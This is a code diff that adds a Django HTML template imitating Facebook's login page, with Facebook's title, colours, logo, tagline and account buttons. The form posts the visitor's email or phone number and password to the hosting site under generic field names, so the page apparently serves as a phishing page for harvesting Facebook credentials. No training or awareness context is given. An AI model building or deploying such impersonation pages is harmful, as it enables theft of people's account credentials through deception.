@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .content {
+            display: flex;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+        }
+
+        .logo-section {
+            flex: 1;
+            padding-right: 32px;
+        }
+
+        .facebook-logo {
+            fill: #1877f2;
+            width: 300px;
+            height: auto;
+            margin-bottom: -10px;
+        }
+
+        .logo-section h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .form-section {
+            flex: 0 0 396px;
+            width: 100%;
+        }
+
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 14px;
+            margin: 16px 0;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            margin: 0 auto;
+            display: block;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 900px) {
+            .content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .logo-section {
+                padding-right: 0;
+                margin-bottom: 30px;
+            }
+
+            .facebook-logo {
+                width: 240px;
+            }
+
+            .logo-section h2 {
+                font-size: 24px;
+                max-width: 400px;
+                margin: 0 auto;
+            }
+
+            .form-section {
+                flex: none;
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+
+        @media (max-width: 450px) {
+            .container {
+                padding: 10px;
+            }
+
+            .facebook-logo {
+                width: 180px;
+            }
+
+            .logo-section h2 {
+                font-size: 20px;
+                padding: 0 16px;
+            }
+
+            .login-form {
+                padding: 15px;
+            }
+
+            input[type="text"],
+            input[type="password"] {
+                padding: 12px 14px;
+                font-size: 16px;
+            }
+
+            .login-button,
+            .create-account {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo-section">
+                <svg class="facebook-logo" viewBox="0 0 300 100">
+                    <path d="M40,0 L260,0 C282.091,0 300,17.909 300,40 L300,60 C300,82.091 282.091,100 260,100 L40,100 C17.909,100 0,82.091 0,60 L0,40 C0,17.909 17.909,0 40,0 Z" fill="none"/>
+                    <path d="M182.744 80V51.212h9.804l1.468-11.382h-11.272v-7.26c0-3.293.914-5.536 5.632-5.536h6.018V16.61c-2.936-.308-5.882-.462-8.832-.462-8.744 0-14.728 5.334-14.728 15.128v8.554h-9.89v11.382h9.89V80h11.91z" fill="#1877f2"/>
+                </svg>
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="form-section">
+                <form method="POST" class="login-form">
+                    {% csrf_token %}
+                    <input type="text" name="{{ form.first_field.name }}" placeholder="Email address or phone number" required>
+                    <input type="password" name="{{ form.second_field.name }}" placeholder="Password" required>
+                    <button type="submit" class="login-button">Log In</button>
+                    <div class="forgot-password">
+                        <a href="#">Forgotten password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">Create New Account</button>
+                </form>
+                <p style="text-align: center; font-size: 14px; margin-top: 28px;">
+                    <strong>Create a Page</strong> for a celebrity, brand or business.
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
